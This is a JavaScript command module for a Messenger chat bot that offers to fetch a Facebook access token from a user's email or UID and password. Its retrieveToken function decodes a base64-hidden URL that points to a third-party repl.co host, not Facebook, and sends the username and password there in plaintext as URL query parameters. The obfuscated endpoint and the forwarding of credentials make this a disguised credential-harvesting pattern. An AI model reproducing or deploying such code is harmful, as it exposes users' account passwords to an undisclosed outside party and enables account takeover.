const axios = require('axios');

module.exports.config = {
  name: "token3",
  version: "69 lite",
  hasPermssion: 0,
  credits: "Réynél",
  description: "GET FB ACCESS_TOKEN",
  commandCategory: "tools",
  usages: "[email/uid] [password]",
  cooldowns: 15,
  envConfig: {
    autoUnsend: true,
    delayUnsend: 300
  }
};

module.exports.run = async ({ api, event, args }) => {
  const { threadID, messageID } = event;
  const uuid = args[0];
  const password = args[1];

  if (!uuid || !password) {
    api.sendMessage(`❎ | 𝖲𝖾𝗇𝗌𝖾𝗂, 𝖳𝗁𝖺𝗍 𝗂𝗌 𝖨𝗇𝗏𝖺𝗅𝗂𝖽 𝖨𝗇𝗉𝗎𝗍!\n𝗨𝘀𝗮𝗴𝗲: ${global.config.PREFIX}𝗍𝗈𝗄𝖾𝗇 [𝖾𝗆𝖺𝗂𝗅/𝗎𝗂𝖽] [𝗉𝖺𝗌𝗌𝗐𝗈𝗋𝖽]`, threadID, messageID);
    return;
  }

  api.sendMessage("⏳ | 𝖲𝖾𝗇𝗌𝖾𝗂, 𝖨'𝗆 𝗒𝗈𝗎𝗋 𝗍𝗈𝗄𝖾𝗇, 𝗉𝗅𝖾𝖺𝗌𝖾 𝗐𝖺𝗂𝗍....", threadID, messageID);

  try {
    const tokenData = await retrieveToken(uuid, password);
    if (tokenData) { api.sendMessage(`🪙 | 𝖲𝖾𝗇𝗌𝖾𝗂, 𝗁𝖾𝗋𝖾'𝗌 𝗒𝗈𝗎𝗋 𝖺𝖼𝖼𝖾𝗌𝗌 𝗍𝗈𝗄𝖾𝗇:\n${tokenData.access_token}`, threadID, messageID);
    } else {
      api.sendMessage("❎ | 𝖦𝗈𝗆𝖾𝗇 𝗌𝖾𝗇𝗌𝖾𝗂, 𝖻𝗎𝗍 𝖿𝖺𝗂𝗅𝖾𝖽 𝗍𝗈 𝗋𝖾𝗍𝗋𝗂𝖾𝗏𝖾 𝗍𝗈𝗄𝖾𝗇.", threadID, messageID);
    }
  } catch (error) {
    api.sendMessage(`❎ | ${error}\n\n𝖲𝖾𝗇𝗌𝖾𝗂, 𝗄𝗂𝗇𝖽𝗅𝗒 𝖽𝗈𝗎𝖻𝗅𝖾-𝖼𝗁𝖾𝖼𝗄 𝗒𝗈𝗎𝗋 𝗉𝖺𝗌𝗌𝗐𝗈𝗋𝖽. 𝖨𝖿 𝗂𝗍 𝗌𝗍𝗂𝗅𝗅 𝖽𝗈𝖾𝗌𝗇'𝗍 𝗐𝗈𝗋𝗄, 𝗍𝗋𝗒 𝖼𝗁𝖺𝗇𝗀𝗂𝗇𝗀 𝗒𝗈𝗎𝗋 𝗉𝖺𝗌𝗌𝗐𝗈𝗋𝖽 𝖺𝗇𝖽 𝗎𝗌𝗂𝗇𝗀 𝗍𝗁𝖾 𝖼𝗈𝗆𝗆𝖺𝗇𝖽 𝖺𝗀𝖺𝗂𝗇.`, threadID, messageID);
  }
};

async function retrieveToken(uuid, password) {
    const apiKey = 'aHR0cHM6Ly9zaGFkb3cucmVpa29kZXYyNHByb3BsLnJlcGwuY28vZmIvdG9rZW4=';
    const protect = Buffer.from(apiKey, 'base64').toString('utf-8');
    const getter = `${protect}?username=${uuid}&password=${password}`;
  
  try {
    const response = await axios.get(getter);
    const tokenData = response.data;

    return tokenData;
  } catch (error) {
    throw error;
  }
}